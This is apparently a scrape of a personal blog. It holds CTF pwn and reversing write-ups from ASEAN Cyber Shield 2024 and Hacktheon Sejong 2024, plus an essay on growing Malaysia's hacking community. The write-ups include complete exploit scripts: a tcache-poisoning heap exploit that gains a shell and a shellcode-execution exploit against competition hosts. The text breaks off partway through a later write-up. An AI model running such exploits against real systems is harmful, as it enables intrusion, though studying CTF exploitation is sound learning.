0x00007fffffffe2a8│+0x0008: 0x00005555555572b6 → jmp 0x555555557289 Our overwrite starts at 0x7fffffffe2a0, so we can just write a null there, and make rbp = NULL.\nrsp \u0026amp; 0xf == 0 is also true, so two out of three constraints of the one_gadget is met.\nThe rcx however is set to some libc address. We can make it null simply by using a pop rcx gadget and setting up a null:\npayload = p64(0) + pop_rcx + p64(0) + one_gadget And with that, we get a shell!\nBoth the tear and vote challenges are actually made by my friend Ainsetin!\nAfter the ctf, he told me that he exploited this challenge by faking vector objects in topic (that\u0026rsquo;s how I learned that the topics were actually stored in vectors), not through tcache poisioning. So if you want to see his exploit, maybe you can contact him.\nexploit.py:\nfrom pwn import * #io = process(\u0026#34;./vote\u0026#34;,aslr=False) io = remote(\u0026#34;127.0.0.1\u0026#34;,13337) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) def add_ctf(idx,name,topic_cnt,do_photo,width,height,photo,topics=[]): io.sendlineafter(b\u0026#34;input:\u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx).encode()) io.sendlineafter(b\u0026#34;name\u0026#34;,name) io.sendlineafter(b\u0026#34;topic cnt\u0026#34;,str(topic_cnt).encode()) for i in range(topic_cnt): io.sendlineafter(b\u0026#34;topic\u0026gt;\u0026#34;,topics[i]) if do_photo: io.sendlineafter(b\u0026#34;photo?\u0026#34;,b\u0026#34;y\u0026#34;) io.sendlineafter(b\u0026#34;width?\u0026#34;,str(width).encode()) io.sendlineafter(b\u0026#34;height\u0026#34;,str(height).encode()) io.sendafter(b\u0026#34;reading photo below\u0026gt;\u0026gt;\u0026#34;,photo) else: io.sendlineafter(b\u0026#34;photo?\u0026#34;,b\u0026#34;n\u0026#34;) def vote_ctf(idx): io.sendlineafter(b\u0026#34;input:\u0026#34;,b\u0026#34;2\u0026#34;) resp = io.recvuntil(b\u0026#34;ctf idx:\u0026#34;) io.sendline(str(idx).encode()) return resp def remove_ctf(idx): io.sendlineafter(b\u0026#34;input:\u0026#34;,b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;idx?\u0026#34;,str(idx).encode()) def mangle(dest,pos): return (pos \u0026gt;\u0026gt; 12) ^ dest # leak heap and libc add_ctf(0,b\u0026#34;AAAA\u0026#34;,1,False,0,0,0,topics=[\u0026#34;a\u0026#34;]) # make topic to prevent consolidation add_ctf(1,b\u0026#34;BBBB\u0026#34;,1,False,0,0,0,topics=[\u0026#34;b\u0026#34;]) remove_ctf(0) remove_ctf(1) payload = b\u0026#34;A\u0026#34;*0x900 + p64(0x1337133713371337) add_ctf(0,b\u0026#34;AAAA\u0026#34;,1,True,-32767,-1,payload,topics=[\u0026#34;a\u0026#34;]) io.recvuntil(p64(0x1337133713371337)) heap_base = u64(io.recv(6) + b\u0026#34;\\x00\\x00\u0026#34;) - 0x131a0 log.info(\u0026#34;HEAP BASE: \u0026#34; + hex(heap_base)) remove_ctf(0) fake_str = p64(heap_base+0x11eb0) + p64(6) payload = fake_str.ljust(0x900,b\u0026#34;\\x00\u0026#34;) + p64(0x1337133713371337) + p64(heap_base+0x12878) + p64(heap_base+0x12898) + p64(heap_base+0x12898) add_ctf(0,b\u0026#34;AAAA\u0026#34;,1,True,-32767,-1,payload,topics=[\u0026#34;a\u0026#34;]) libc.address = u64(vote_ctf(0)[0x5d:0x5d+6]+b\u0026#34;\\x00\\x00\u0026#34;) - 0x219ce0 log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) add_ctf(1,b\u0026#34;placeholder\u0026#34;,1,False,0,0,0,topics=[\u0026#34;a\u0026#34;]) # leak environ fake_str = p64(libc.address+0x221200) + p64(10) payload = fake_str.ljust(0x900,b\u0026#34;\\x00\u0026#34;) + p64(0x1337133713371337) + p64(heap_base+0x13208) + p64(heap_base+0x13228) + p64(heap_base+0x13228) add_ctf(2,b\u0026#34;AAAA\u0026#34;,1,True,-32767,-1,payload,topics=[\u0026#34;a\u0026#34;]) environ = u64(vote_ctf(0)[0x108:0x108+8]) log.info(\u0026#34;ENVIRON: \u0026#34; + hex(environ)) # all bins are empty now, setup heap for tcache poisoning add_ctf(3,b\u0026#34;AAAA\u0026#34;,1,False,0,0,0,topics=[b\u0026#34;A\u0026#34;*0x20]) # for some reason, this will free a 0x50 chunk add_ctf(4,b\u0026#34;AAAA\u0026#34;,1,False,0,0,0,topics=[b\u0026#34;A\u0026#34;*0x20]) # this sets it up so that two 0x30 chunks are together remove_ctf(4) # in memory, there is now: free object chunk, followed by two 0x30 tcache chunks #gdb.attach(io,gdbscript=\u0026#34;x/8gx 0x55555555c2c0\\n heap set-arena 0x1555552acc80\u0026#34;) # overwrite fd ptr in tcache ret = environ - 0x148 fd_overwrite = b\u0026#34;A\u0026#34;*0x900 + p64(0x1337133713371337) + p64(0)*2 fd_overwrite += p64(0) + p64(0x31) + p64(mangle(ret,heap_base+0x14ed0)) add_ctf(5,b\u0026#34;AAAA\u0026#34;,0,True,-32767,-1,fd_overwrite) # overwrite ret pointer #gdb.attach(io,gdbscript=\u0026#34;break *0x555555556c2e\u0026#34;) pop_rcx = p64(libc.address + 0x8c6bb) one_gadget = p64(libc.address+0x50a37) payload = p64(0) + pop_rcx + p64(0) + one_gadget add_ctf(6,b\u0026#34;AAAA\u0026#34;,1,False,0,0,0,topics=[payload]) io.interactive() Conclusion This was the first time I got on the podium after playing so many ctfs, and to do it representing Malaysia, was really exciting. I really have to thank my teammates Firdaus, Teng, and Raihan for all of their hardwork. Also thanks to the entirety of team Malaysia for making the trip so fun, everyone did great!\nThanks a lot to the organisers as well, the hotel and venue they booked were really top tier. I had a lot of fun with the pwn challs too, but I think some of them required too much reversing, and they should\u0026rsquo;ve given the source code.\nHappy that I met quite a few friends from previous events too! Ha Long Bay was great, really good food, and really nice views. Had a great time.\n","permalink":"https://zhirenliew.github.io/posts/acs24/","summary":"writeups for acs pwn challs","title":"ASEAN Cyber Shield 2024"},{"content":"There\u0026rsquo;s been quite a lot of efforts done by people in the malaysian hacking community to increase the skill level of hackers here, and to find/produce talents in hacking so that malaysia can actually stand a chance in competing with other countries for hacking. I think its great that there are passionate people working on this, simply for the betterment of the malaysian hacking scene, but I do think that there are things that could be done differently, and that there should be changes in how the malaysian community thinks of hacking in general.\nplease don\u0026rsquo;t take this post the wrong way, I fully respect the people working on the communities, and their dedication to making hackers in malaysia better. This post is just me sharing some of my thoughts. cheers.\nDon\u0026rsquo;t seek talents, make talents I feel like people working on this has put quite an emphasis on finding existing talents in malaysia, but I think that the focus/aim shouldn\u0026rsquo;t actually be about finding talents, but to actually have a way of making talents, in a natural organic way.\nLet\u0026rsquo;s be real here, how likely is it to find another cracked hacker in malaysia? I\u0026rsquo;m guessing not very likely. And if there really are, how likely is it that they would want to join the community and help malaysia in growing the community? How would it benefit them?\nBut if the aim is really finding existing malaysian hacking talents, then the solution kind of just boils down to two things.\nincreasing exposure so that they actually know about the communities making them actually want to join the community. And I\u0026rsquo;ll get back to how to do those things in a minute.\nBut if we actually want to make malaysia a force to be reckoned with in terms of hacking, we should be making talents instead. There is only going to be a limited number of talents in malaysia, so if you only look for talents, there is only going to be a limit on how good malaysia can be in hacking. Even if at one point there are a lot of talents, malaysia is just going to have great hackers at that point in time, and its gonna die down when the next generation comes. But if you have a good way of constantly making talents, then there is no limit, and malaysia is just going to get better and better.\nSo now, how do you \u0026ldquo;make talents\u0026rdquo;? What is a good way of doing that? By building a highly passionate and skilled community.\nSkilled and passionate community Let\u0026rsquo;s take a look at Indonesia. The 9th best ctf team last year on ctftime, SKSD, was a team full of indonesians. The members know the team through word of mouth, and well, through good ctf results. They don\u0026rsquo;t even have an application form, they just find members through the indonesian hacking community. Indonesia also has 2 people representing team asia this year for ICC, which kind of means that they were the best among the asian ctf players this year.\nIn short, indonesia has cracked hackers.\nThey don\u0026rsquo;t have much governement support, they aren\u0026rsquo;t really more technologically advanced than us, and idt their education system teaches hacking. So how did they do that? Through community. They are the prime example of what a skilled and passionate community can do.\nIf your community is skilled and passionate, you won\u0026rsquo;t have to worry about anything else. One of best things that hacking (and well geohot) taught me, is that\nSkill is everything\nEven more so in technical fields like hacking. And this doesn\u0026rsquo;t apply to just individuals, but applies to communities. If your community is skilled, it will automatically gain reputation through results, it will attract more people into your community, and it will ignite the passion of people in your community, to learn more about hacking and to get better. You don\u0026rsquo;t need to promote your community or do this and that if your community is skilled. Everything is easy once you have skill.\nPretty much everyone in indonesia knows SKSD, and they don\u0026rsquo;t even have a twitter page. They just did well in ctfs. I think that tells you everything you need to know.\nIf we now revisit the idea of seeking talents. Funnily enough, the best solution to seek talents is to make a skilled and passionate community as well. Since you automatically gain reputation, and talents would have a reason of joining your community, to meet other skilled people, and to get better themselves.\nWe have hacking communities in malaysia, quite a few of them actually, but the problem now is how do you make them skilled?\nBefore we discuss about that, I want to make a comment on how I think malaysian hacking communities should think about hacking.\nWhat hacking is really about I feel like malaysian hacking communities is really focused on the corporate side of hacking. People are more focused on getting certs and posting on linkedin, and well, getting jobs in companies. People play ctfs and go to events not mainly for the passion of it, but to have more things to write about in their cv .\nWhich obviously I understand, people go to universities to get degrees in \u0026ldquo;cybersecurity\u0026rdquo;, aiming to make a living out of hacking.\nBut I feel like that is not what hacking is about.\nI feel like the essence of hacking is in the curiosity and passion for it. To be curious about how computers work on a deeper level, to be invested in how we can trick computers into doing what we want. To learn and research something even if there is no obvious use of it, simply because we are interested in it and want to learn how it works.\nIs that not what hacking is about?\nIsn\u0026rsquo;t that what original hacking culture is like? To learn about hacking through forums, through places like phrack. To experiment with computers yourself. To stay in during a friday night, staying up late, exploiting computers, simply for the fun and joy of it. Simply because you like to do it.\nYou don\u0026rsquo;t need to go to school to learn how to hack (and frankly, learn anything to do with computer science). You just need to be interested and passionate enough, to learn it through resources yourself.\nI feel like maybe one of the reasons I like hacking so much is because of the culture behind it, because of what it represents. To learn and do things yourself simply because you\u0026rsquo;re interested, and to have skill put on such a high level of value.\nNow the funny thing is, once you kind of have this mindset of doing things and learning hacking simply because you want to do it, you\u0026rsquo;re able to rack up a lot of hours doing this stuff, which will translate to skill. So you\u0026rsquo;ll gain a lot of skill doing what you like, and because you have skills, you\u0026rsquo;ll be able to get a job much easier.\nSo if the objective was to get a job, it\u0026rsquo;ll be harder to so, than if you were to just do what you like and have fun hacking.\nLike what liveoverflow said in this video, to get good at something, you simply need to accumulate thousands of hours doing said thing. And if you think of hacking in the sense of the way you think of an education system, and you treat it as studying, I feel like it would be a lot harder to accumulate those hours, than if you were to just do what you like.\nTo truly be cracked at hacking, you first have to be passionate and interested in it. I mean if you\u0026rsquo;re not passionate/interested about it in the first place, what good reason do you have to get good at something like hacking? All of the cracked hackers I\u0026rsquo;ve talked to, loves to hack. Its not a chore like studying to them, its more so, a hobby.\nI feel like malaysian hacking communities don\u0026rsquo;t really think of hacking this way. In other words, I feel like they focus more on \u0026ldquo;cybersecurity\u0026rdquo;, and not really hacking. So I think a shift in how the communities think about hacking, can greately increase the general skill level.\nSo now going back to how we can increase the skill level of existing communities.\nDo more, get better Like I mentioned above, the only way to get better is by accumulating hours, and I feel like the best way to accumulate those hours is by doing ctfs.\nThe 4 main categories of ctfs (pwn, web, crypto, re) are just some of the purest forms of hacking there is. If you\u0026rsquo;re able to perform well in hard ctfs, then you can pretty confidently say that you\u0026rsquo;re quite a good hacker. And if you want to cause real world impact, you just have to learn how to apply those skills in real life scenarios.\nAnd so how do you get good at ctfs? you play.\nLook at PPP for example, they started out as a hacking club in carnegie mellon, playing ctfs every week. And they went on to become one of the best teams ever, winning their 7th defcon in 2023.\nWhen I was Sejong for hacktheon finals, mechfrog gave a really good suggestion to hold physical ctf sessions for M53. And I think that that\u0026rsquo;s one of the best things that could be done in malaysian hacking communities, to hold more physical ctf team sessions, playing international ctfs.\nYou don\u0026rsquo;t need a lot of people to show up, 10 - 20 people is more than enough! It gives motivation for people to actually go and play ctfs, and more importantly it gives opportunities for people to learn from better players.\nSay you\u0026rsquo;re a really cracked web player, would you rather teach some guy how to do web on discord, or have a person ask you in real life how you solved some chall on a ctf. Definetely the latter right? Its just so much easier to learn from others when both of you have tried the same challange, and you could communicate with them directly in real life.\nAnd since we do have quite a few talents in malaysia now, we should make full use of them by doing these physical ctf sessions. Talents are not the norm, I don\u0026rsquo;t think another good crypto player like mechfrog will pop up randomly in malaysia anytime soon. So what we should do now is to build the next generation of talents, by having beginners play ctf together physically with more experienced folks, giving the beginners the opportunity to learn from them.\nAnd you don\u0026rsquo;t need a bunch of beginners too. Just having let say one crypto beginner who is passionate about crypto, does crypto for fun, and shows up to the physical ctf session every time, will have you a cracked crypto player in the future.\nIf we can do that, then the skilled community kind of becomes self sustaining, not needing to depend on random talents that pop up, but able to have the current generation of cracked people help build up the next gen of cracked people, and so on and so forth.\nQuality of malaysian ctfs Malaysian ctfs tend to focus more on forensics and osint and random categories like scada, and really really neglect pwn and crypto. The level of web challanges in local ctfs are also incomparable to international ones.\nI think this is just a reflection of the current skill level and skillset of the malaysian hacking community. The amount of stuff you need to know/learn before actually doing pwn/crypto is a lot more than doing forensics and osint, so I think that\u0026rsquo;s why beginners tend to flock towards those categories instead of taking the time and learning pwn/crypto. Plus, since there are a lot of osint/forensics challs in local ctfs, beginners are more eager to learn them too since they give more points, so it kinda forms a positive feedback loop of, more forensics/osint players, causing and caused by more forensics/osint ctf challanges.\nAnd I\u0026rsquo;m not saying that forensics and osint ctf challanges are bad, I\u0026rsquo;m just saying that they are so oversaturated in the local ctf scene, that beginners would just flock towards those categories, and not try out the other categories, making there be less and less pwn/web/crypto/re players.\ntrust me, pwn/web/crypto/re is a lot more fun than forensics and osint, you just have to take your time and learn them if you\u0026rsquo;re interested\nSo that is kind of way I specifically mentioned international ctfs for the physical ctf jam sessions. I mean it makes a lot of sense tho right, to compete internationally, you have to play internationally.\nBut this problem with the quality of malaysian ctfs shouldn\u0026rsquo;t be a priority to solve by malaysian communities, since it will be automatically solved when the skill level of the commmunity increases. So if you\u0026rsquo;re a community lead, the main emphasis should still be put on more physical ctf sessions playing medium difficulty international ctfs. You may not get results at first, but you will certainly be getting better.\nA small group of people can influence the environment.\nSay you\u0026rsquo;re able to form this small group of 10 - 15 people who frequently plays physical ctfs together, and they get more and more skilled, getting better and better results. And now ctf organisers look to them to make ctf challanges, and because they\u0026rsquo;re more skilled, they can make harder challanges with more quality. So now the whole ctf game is stepped up.\nThe environment influences people.\nThe local ctfs are getting harder and harder, there\u0026rsquo;s more pwn/web/crypto/re, and the quality is increasing rapidly. Thus the players will get better and better, and in turn, they will make better ctf challanges too.\nConclusion I think that we already have the resources and the talent needed to make cracked hackers in malaysia, its just a matter of mindset and what to focus on that needs to be changed. There\u0026rsquo;s probably still quite a number of factors that I didn\u0026rsquo;t think about, but I think the general idea of what needs to be changed should be what I talked about above.\nI got mock exams in 2 days, so I can\u0026rsquo;t spend anymore time on this. Might refine this more in the future, idk. Happy to talk about it, so just find me on twitter or discord or talk to me irl.\nSome cool videos/things I\u0026rsquo;ve seen over the years that relates to the topic:\nHow not to be a noob - George Hotz CTFs are AWESOME! the Hacker\u0026rsquo;s Manifesto How the Best Hackers Learn Their Craft The Secret step-by-step Guide to learn Hacking Hacker Culture Meritocracy? The Origin of Script Kiddie - Hacker Etymology wargames.my, as of now the only local ctf ik that has the potential to compete with international ctfs ","permalink":"https://zhirenliew.github.io/posts/making_cracked_hackers/","summary":"my opinions on how to make skilled hackers in malaysia","title":"Making cracked hackers in malaysia"},{"content":" Overview Last week, I traveled to Sejong, South Korea with my Malaysian team Kopi Cincau (comprising of me, Kelzin, Firdaus, and Teng) to play in this year\u0026rsquo;s Hacktheon Sejong Finals (Advanced category).\nWe only managed to get #12 in the Advanced category, but it was a super tight ctf. The difference between us and first place were only 2 challanges. (We would\u0026rsquo;ve gotten #2 if we played in the beginner category!). It was a good experience overall, and I\u0026rsquo;m grateful for the opportunity to go there and play.\nThis post is going to be first writeups for some of the challenges I\u0026rsquo;ve solved/contributed in, and then its gonna be a short blog about my experience there.\nAll challenges and exploit scripts could be found here.\nThanks to Secure D and CyberWise for sponsoring the trip, and SherpaSec for supporting us too. Also thanks to Trailbl4z3r for helping us throughout the trip! The trip wouldn\u0026rsquo;t be possible without them.\nWriteups Interpreter 1 (rev) This was a C++ reversing challenge that I solved together with Teng. I didn\u0026rsquo;t want to work on this challenge at first since it was C++ reversing, but then Teng had some progress on it, and it seemed like quite a few teams have solved the challenge, so I hopped on the chall. We didn\u0026rsquo;t really solve this by reversing everything, but instead using dynamic analysis.\nThe challenge was an expression interpreter, and could process operators like +,-,*,/ The main function consisted of a lot of functions, but eventually Teng found the function which printed the flag, and also the check function to check if we have the correct input\n... uVar7 = FUN_00103f60(local_108,local_90); if ((uVar7 \u0026amp; 1) != 0) { print_flag(); } ... Taking a look at the check function:\n// FUN_00103f60 __int64 __fastcall final_check(_QWORD *a1, _QWORD *a2) { v4 = op_shift_right(a1); if ( v4 == op_shift_right(a2) ) // check for expression { for ( i = 0LL; i \u0026lt; 0x14; ++i ) { v3 = *(unsigned __int16 *)sub_4048B0(a1, i); if ( v3 != *(unsigned __int16 *)sub_4048B0(a2, i)) { // check two bytes at a time v6 = 0; return v6 \u0026amp; 1; } } v6 = 1; } else { v6 = 0; } return v6 \u0026amp; 1; } __int64 __fastcall op_shift_right(_QWORD *a1){ return (__int64)(a1[1] - *a1) \u0026gt;\u0026gt; 1; } __int64 __fastcall sub_4048B0(_QWORD *a1, __int64 a2){ return *a1 + 2 * a2; } Through gdb, we realised that **a2 is always the same, and that our input could manipulate the values in **a1, so we assumed that the aim is to make **a1 == **a2.\n0x555555557f60 ( $rdi = 0x00007fffffffe110 (a1) → 0x0000555555598820 → 0x0002800000018000, \u0026lt;-|-- make them same $rsi = 0x00007fffffffe188 (a2) → 0x0000555555597ae0 → 0x0002800000038000 \u0026lt;-| ) So first we have to pass the op_shift_right check, and to analyse that we breakpointed at the comparison of v4 == op_shift_right(a2)\n$rax : 0x8 $rcx : 0x14 → 0x555555557f9a cmp rax, rcx By playing around with different inputs and expressions, we found out that we could change the value of rax by passing in different combinations of + - * / in the expression.\nWe then were able to pass this check by using the input -123+122+232*12321/12312+12312\nNext up, it seems like the check function compares the bytes in a1 and a2 two bytes at a time. They check a total of 0x28 bytes. So what we did next was logically analyse what was inside a2 in the check function, and try to see how our expresssion is stored in memory.\nI noticed that the bytes seem to be in 2 bytes chunks, and since the check function also check two bytes at a time, I examined the memory 2 bytes at a time\n1+1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8010 1-1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8011 1*1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8012 1/1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8013 So we can see that numbers are stored in 2 bytes, in front of every number there is a 0x8000, and that +: 0x8010 -: 0x8011 *: 0x8012 /: 0x8013 Further analysing by chaining expressions\n1+2-3*4/5 in memory 0x555555597b10: 0x8000 0x0001 0x8000 0x0002 0x8010 0x8000 0x0003 0x8000 0x555555597b20: 0x0004 0x8012 0x8000 0x0005 0x8013 0x8011 We then realised this is just an implementation of a stack machine, and that 0x8000 was just a push instruction, and 0x8011,0x8012,...just performs an operation on the top two values on the stack.\nSo now that we know how the expression is saved in memory, we can look at the expression that is compared, and try to mimic that expression.\n0x8000 0x0003 0x8000 0x0002 0x8000 0x0005 0x8012 0x8000 0x0004 0x8011 0x8010 0x8000 0x0007 0x8000 0x0006 0x8000 0x0003 0x8013 0x8012 0x8010 Reversing this expression using the info above, we can deduce that the final expression should be (3+((2*5)-4))+(7*(6/3)).\nsimpllocator (pwn) There is a python file which loads a library ELF file called simpllocator.so. and allows us to interact with the functions of the library by sending json data\nfrom socket import * import json import ctypes import base64 lib = \u0026#39;./simpllocator.so\u0026#39; funcs = ctypes.cdll.LoadLibrary(lib) print(funcs) # void init() init = funcs.init # int allocate() allocate = funcs.allocate allocate.restype = ctypes.c_int # prob is return type # int insert(fd, ptr, sz) insert = funcs.insert insert.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int8), ctypes.c_int] # prob is argument type insert.restype = ctypes.c_int # int delete(fd) delete = funcs.delete delete.argtypes = [ctypes.c_int] delete.restype = ctypes.c_int # int mprotect(fd, flag) mprotect = funcs.fd_mprotect mprotect.argtypes = [ctypes.c_int, ctypes.c_int] mprotect.restype = ctypes.c_int # int execute(fd) execute = funcs.execute execute.argtypes = [ctypes.c_int] execute.restype = ctypes.c_int def parse_args(args): res = list() for arg in args: # in json data, have to mention type also type = arg[\u0026#39;type\u0026#39;] data = arg[\u0026#39;data\u0026#39;] if type == \u0026#39;INT\u0026#39;: data = ctypes.c_int(arg[\u0026#39;data\u0026#39;]) elif type == \u0026#39;PTR\u0026#39;: decoded = base64.b64decode(arg[\u0026#39;data\u0026#39;]) data = {\u0026#39;data\u0026#39; : (ctypes.c_int8 * len(decoded))(*decoded), \u0026#39;len\u0026#39; : ctypes.c_int(len(decoded))} else: return None res.append(data) return res init() print(\u0026#34;Hello! This is Simpllocator!\u0026#34;) while True: argc = 0 args = None received = input() try: received = json.loads(received) callNum = received[\u0026#39;callNum\u0026#39;] if received[\u0026#39;args\u0026#39;] is not None: argc = len(received[\u0026#39;args\u0026#39;]) args = received[\u0026#39;args\u0026#39;] if callNum == 1: if argc != 0: continue print(f\u0026#34;fd[{allocate()}] created.\u0026#34;) # allocate is called here elif callNum == 2: if argc != 2 or received[\u0026#39;args\u0026#39;][0][\u0026#39;type\u0026#39;] != \u0026#39;INT\u0026#39;: continue c_args = parse_args(args) if c_args is not None: if 0 \u0026lt;= insert(c_args[0], c_args[1][\u0026#39;data\u0026#39;],c_args[1][\u0026#39;len\u0026#39;]): # !!! the 2nd arg is just a string print(f\u0026#34;Data inserted at fd[{received[\u0026#39;args\u0026#39;][0][\u0026#39;data\u0026#39;]}]\u0026#34;) elif callNum == 3: if argc != 1 or received[\u0026#39;args\u0026#39;][0][\u0026#39;type\u0026#39;] != \u0026#39;INT\u0026#39;: continue c_args = parse_args(args) if 0 \u0026lt;= delete(c_args[0]): print(f\u0026#34;fd[{received[\u0026#39;args\u0026#39;][0][\u0026#39;data\u0026#39;]}] was deleted.\u0026#34;) elif callNum == 4: if argc != 2 or received[\u0026#39;args\u0026#39;][0][\u0026#39;type\u0026#39;] != \u0026#39;INT\u0026#39; or received[\u0026#39;args\u0026#39;][1][\u0026#39;type\u0026#39;] != \u0026#39;INT\u0026#39;: continue c_args = parse_args(args) if 0 \u0026lt;= mprotect(c_args[0], c_args[1]): print(f\u0026#34;fd[{received[\u0026#39;args\u0026#39;][0][\u0026#39;data\u0026#39;]}] permission changed.\u0026#34;) elif callNum == 5: if argc != 1 or received[\u0026#39;args\u0026#39;][0][\u0026#39;type\u0026#39;] != \u0026#39;INT\u0026#39;: continue c_args = parse_args(args) if 0 \u0026lt;= execute(c_args[0]): print(f\u0026#34;fd[{received[\u0026#39;args\u0026#39;][0][\u0026#39;data\u0026#39;]}] was executed.\u0026#34;) except: so how you interact with the functions is by sending json data like:\n{ \u0026#34;callNum\u0026#34;: ..., \u0026#34;args\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;...\u0026#34;, \u0026#34;data\u0026#34;: ... }, { \u0026#34;type\u0026#34;: \u0026#34;...\u0026#34;, \u0026#34;data\u0026#34;: ... } ] } taking a look at the library functions:\nint init(EVP_PKEY_CTX *ctx){ setvbuf(stdin,(char *)0x0,2,0); setvbuf(stdout,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); pagesize = sysconf(0x1e); return 0x1040f0; } void allocate(void){ undefined4 *__s; __s = (undefined4 *)malloc(pagesize); memset(__s,0,pagesize); *__s = 1; createfd(__s); return; } int createfd(undefined8 param_1){ int idx; idx = 0; while( true ) { if (9 \u0026lt; idx) { return -1; } if (*(fds + idx * 8) == 0) break; // fds is a global variable idx = idx + 1; } *(fds + idx * 8) = param_1; return idx; } undefined8 insert(uint param_1,void *param_2,uint param_3){ undefined8 uVar1; if (*(long *)(fds + (ulong)param_1 * 8) == 0) { uVar1 = 0xffffffff; } else { if (pagesize - 4 \u0026lt; param_3) { uVar1 = 0xffffffff; } else { memcpy((*(fds + param_1 * 8) + 4),param_2,param_3); uVar1 = 0; } } return uVar1; } int fd_mprotect(int param_1,int param_2){ undefined4 *chunkPtr; int iVar2; chunkPtr = *(fds + (long)param_1 * 8); if (chunkPtr == (undefined4 *)0x0) { iVar2 = -1; } else { if (param_2 == 1) { iVar2 = mprotect((chunkPtr \u0026amp; -pagesize),pagesize,3); *chunkPtr = 1; } else { if (param_2 == 2) { iVar2 = mprotect((void *)((ulong)chunkPtr \u0026amp; -pagesize),pagesize * 2,7); // makes it executable? *chunkPtr = 2; } else { iVar2 = -1; } } } return iVar2; } undefined8 execute(int param_1,undefined8 param_2){ int *piVar1; undefined8 uVar2; piVar1 = *(int **)(fds + (long)param_1 * 8); if (piVar1 == (int *)0x0) { uVar2 = 0xffffffff; } else { if (*piVar1 == 2) { // execute shellcode starting from second byte (*(piVar1 + 1))(param_1,param_2,piVar1 + 1); uVar2 = 0; } else { uVar2 = 0xffffffff; } } return uVar2; } undefined8 delete(uint param_1){ int *__ptr; undefined8 uVar1; __ptr = *(int **)(fds + (ulong)param_1 * 8); if (__ptr == (int *)0x0) { uVar1 = 0xffffffff; } else { if (*__ptr != 1) { fd_mprotect(param_1,2); } free(__ptr); *(undefined8 *)(fds + (ulong)param_1 * 8) = 0; uVar1 = 0; } return uVar1; } reversing the functions is just:\nalloc() allows us to allocate a page mprotect() allows to change permissions of the page insert() allows us to write to the page execute() allows us to execute instructions in the page So what we can literally do is just allocate a page, write shellcode to the page, make the page executable, and execute it. Simple as that.\nWe just have to send the json data correctly to invoke the calls.\nI wasted a lot of time on this challenge because I understood the insert function wrongly, and thought that it takes in a ptr, and copies input from the ptr into the page. But it actually just takes in raw bytes (which is stored in the form of a string), and the bytes are just copied to the page. So yeah I overcomplicated it.\nfrom pwn import * import json import base64 #io = process([\u0026#34;python3\u0026#34;,\u0026#34;simpllocator.py\u0026#34;],aslr=False) io = remote(b\u0026#34;hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com\u0026#34;,17935) def alloc(): a = {\u0026#34;callNum\u0026#34;: 1, \u0026#34;args\u0026#34;: None} io.sendline(json.dumps(a)) def insert(idx,payload): a = { \u0026#34;callNum\u0026#34;: 2, \u0026#34;args\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;INT\u0026#34;, \u0026#34;data\u0026#34;: idx }, { \u0026#34;type\u0026#34;: \u0026#34;PTR\u0026#34;, \u0026#34;data\u0026#34;: base64.b64encode(payload).decode()} ] } io.sendline(json.dumps(a)) def mprotect(idx,permission): a = { \u0026#34;callNum\u0026#34;: 4, \u0026#34;args\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;INT\u0026#34;, \u0026#34;data\u0026#34;: idx }, { \u0026#34;type\u0026#34;: \u0026#34;INT\u0026#34;, \u0026#34;data\u0026#34;: permission} ] } io.sendline(json.dumps(a)) def execute(idx): a = { \u0026#34;callNum\u0026#34;: 5, \u0026#34;args\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;INT\u0026#34;, \u0026#34;data\u0026#34;: idx }, ] } io.sendline(json.dumps(a)) sc = b\u0026#34;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\u0026#34; alloc() mprotect(0,2) insert(0,sc) execute(0) io.interactive() Dict (pwn) The binary is just a simple dictionary / key-value store.\nThis is Simple Dictionary 1. Insert 2. Find 3. Exit \u0026gt; 1 Key \u0026gt; ABAB Value \u0026gt; CDCD Insert success There is a checkflag() function which is called every loop.\nvoid main(void){ setup(); puts(\u0026#34;This is Simple Dictionary\u0026#34;); do { main_loop(); checkflag(); } while( true ); } void checkflag(void){ local_10 = *(long *)(in_FS_OFFSET + 0x28); if (DAT_00105080 == 0x31337) { __fd = open(\u0026#34;flag\u0026#34;,0); ... read(__fd,\u0026amp;local_58,0x40); printf(\u0026#34;Flag: %s\\n\u0026#34;,\u0026amp;local_58); } } return; } So to get the flag, we just have to overwrite DAT_00105080 to 0x31337.\nI was guessing that the key-values were probably just stored in the global variables memory region, and we could just somehow overwrite DAT_00105080 from there.\nTo test this, we can just:\ngef➤ search-pattern ABAB [+] Searching \u0026#39;ABAB\u0026#39; in memory [+] In \u0026#39;/home/vagrant/ctf/hacktheon_finals24/dict/dict\u0026#39;(0x555555558000-0x555555559000), permission=rw- 0x555555558081 - 0x55555555808e → \u0026#34;ABAB\\n=CDCD\\n\u0026#34; gef➤ x/s 0x555555558080 0x555555558080:\t\u0026#34;,ABAB\\n=CDCD\\n\u0026#34; and the data we\u0026rsquo;re trying to overwrite is at 0x0000555555559080.\nSo yeah, assuming that there is no limit for the amount of key-values we can make / the limit is large enough, we can just make 0x1000 bytes worth of key-values and then write 0x31337.\nLooking at the function that reads the key-values:\nint * FUN_00101375(void){ ... printf(\u0026#34;Key \u0026gt; \u0026#34;); sVar3 = read(0,\u0026amp;local_b8,0x20); ... printf(\u0026#34;Value \u0026gt; \u0026#34;); sVar3 = read(0,\u0026amp;local_98,0x80); ... } The max amount of bytes a key can have (counting newline byte) is 0x20, and the max amount of bytes a value can have is 0x80. So we just have to make around 0x1000/(0x20+0x80) ~ 25 key-values, to overwrite the global variable that is checked for flag.\nIt seems that commas and equal signs are added to the key-value strings, also newline bytes are stored too, 